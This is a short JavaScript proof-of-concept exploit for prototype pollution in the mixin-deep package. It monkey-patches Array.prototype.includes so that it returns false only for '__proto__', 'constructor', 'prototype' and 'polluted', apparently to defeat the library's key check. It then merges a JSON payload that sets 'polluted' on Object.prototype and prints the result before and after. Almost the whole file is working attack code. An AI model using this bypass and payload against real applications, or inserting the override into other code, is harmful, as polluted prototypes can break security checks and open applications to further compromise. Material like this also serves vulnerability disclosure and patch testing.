Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mixin = require('mixin-deep');
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
let obj = {};
console.log({}.polluted);
mixin({}, JSON.parse(payload));
console.log({}.polluted);